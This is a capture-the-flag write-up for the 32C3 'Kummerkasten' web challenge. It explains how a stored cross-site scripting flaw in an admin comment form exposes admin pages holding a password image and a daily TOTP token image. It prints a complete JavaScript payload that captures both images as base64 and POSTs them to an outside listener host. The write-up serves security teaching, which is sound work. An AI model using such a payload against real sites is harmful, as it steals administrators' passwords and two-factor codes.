---
title: "32C3CTF - Kummerkasten (Web 300)"
header:
  image: /assets/images/32c3/kummerkasten/header.png
tags:
  - 32c3
  - writeup
  - web
  - xss
---

Steal the password and TOTP token from an admin using cross-site scripting.

## Challenge Description

#### Points

300

#### Description

```
Our Admin is a little sad this time of the year. Maybe you can cheer him up at
this site

Please note: This challenge does not follow the flag format.
```

## Solution

When navigating to the website, we are shown a message about the depressed admin
and a form to send him messages. Turns out, the website is vulnerable to
cross-site scripting so let's try and get a view at what the admin is looking at
when he views our comment.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/32c3/kummerkasten/1.png){: .align-center}

In the response, we get some interesting HTML back:

```html
        <div id="navbar" class="collapse navbar-collapse">
          <ul class="nav navbar-nav">
            <li class="active comments comment"><a href="/admin/comments">Comments</a></li>
            <li class="bugs"><a href="/admin/bugs">Bugs</a></li>
          </ul>
          <img src="img/spinner.svg" class="spinner pull-right" style="height: 50px; display: none;">
    <ul class="nav navbar-nav navbar-right">
      <li class="token"><a href="/admin/token">HACK - Token</a></li>
    </ul>
```

Now, if let's try to get `/admin/bugs`:

![2]({{ site.url }}{{ site.baseurl }}/assets/images/32c3/kummerkasten/2.png){: .align-center}

We get the following response:

```html
        <h1>Bug reports</h1>
        <div class="bug">
        <p><h4>New bug report from Zero Cool on 2015-12-28</h4></p>
                <p>Hello Admin,...
        I know that you're not in a good place right now. I've been
        told to go easy on you. But guess what I just found browsing
        through the latest commits to our PUBLIC (!!!!) GitHub
        repository.
        </p>
        <img src="admin/img/root_pw.png?20151228" id="img-bug-0003"/>
        <p>
        Is this really our production MySQL password? And is this by any chance
        the exact same password you're using everywhere else?  <br/>
        <b>Are you fucking kidding me?</b><br/>
        Please tell me that this is not also your password for the admin section...<br/>
        The only thing that luckily prevents anyone from exploiting this is
        that we enforce Two Factor Authentication. Even an imbecile
        like you can't fuck this up since it's only stored on your phone...<br/>
        Sorry admin, but this is unacceptable. I've deleted the checkin from
        the repo and I don't think anyone saw the commit...</p>
        <footer>Zero Cool on 2015-12-28</footer>
        </div>
        <hr/>
        <div class="bug">
        <p><h4>New bug report from Acid Burn on 2015-12-20</h4></p>
            <blockquote>
                <p>Hello Admin,
        Sorry for filing a bug, but I thought this was the quickest way to
        reach you. I've found the library you were looking for, it's called
        pyotp. You haven't told me what you're planning on doing with it, but
        knowing you it will be something really cool. I've found that the
        easiest way to use the token is to just append it to your password
        (i.e. as the last six digits).</p>

        <p>I probably don't have to tell you to keep your TOTP token
        (and especially the seed) safe from prying eyes ;)</p>
                <footer>Acid Burn on 2015-12-20</footer>
            </blockquote>
        </div>
      </div>
      </div>
```

Before we continue, let's repeat the process for /admin/token . We get the
following response:

```html
        <h1>TOTP Token for today</h1>
        <p>
        The token for today is:<br/>
        <img src="admin/img/token.png?20151228" id="img-token"/>
        </p>
        </div>
```

Let's summarise what we have found so far:

1. Dade (Zero Cool) sends a message to the admin about his insecure password and
   his including the password in a commit. He includes an image of the commit which
   should include the password.
2. Kate (Acid Burn) sends a message saying that the easiest way to use the two
   factor token is to append the token to the password.
3. We have obtained a link an image of the token.

What we have to do is get those two images, concatenate the token to the
password and we have our flag. Here is the payload we used to get the images
(canvas code from this [stackoverflow
thread](http://stackoverflow.com/questions/6150289/how-to-convert-image-into-base64-string-using-javascript)):

```javascript
<script>
function ib64(url, predata, callback, outputFormat){
    var img = new Image();
    img.crossOrigin = 'Anonymous';
    img.onload = function(){
        var canvas = document.createElement('CANVAS');
        var ctx = canvas.getContext('2d');
        var dataURL;
        canvas.height = this.height;
        canvas.width = this.width;
        ctx.drawImage(this, 0, 0);
        dataURL = canvas.toDataURL(outputFormat);
        callback(predata + dataURL);
        canvas = null;
    };
    img.src = url;
}

var upass = 'admin/img/root_pw.png?20151228';
var utoken = 'admin/img/token.png?20151228';
ib64(upass, '', function(passimg){
  ib64(utoken, passimg + ':', function(totalimg){
    $.ajax({
      type: "POST",
      url: "http://codesinverse.com:1337/pwn",
      data: totalimg
    });
  });
});
</script>
```

After decoding the base64, we get the two images. The password image:

![3]({{ site.url }}{{ site.baseurl }}/assets/images/32c3/kummerkasten/3.png){: .align-center}

The token image:

![4]({{ site.url }}{{ site.baseurl }}/assets/images/32c3/kummerkasten/4.png){: .align-center}

Combining the two we get 1\_4m\_numb3r\_0n3!629880.

Flag: **1\_4m\_numb3r\_0n3!629880**


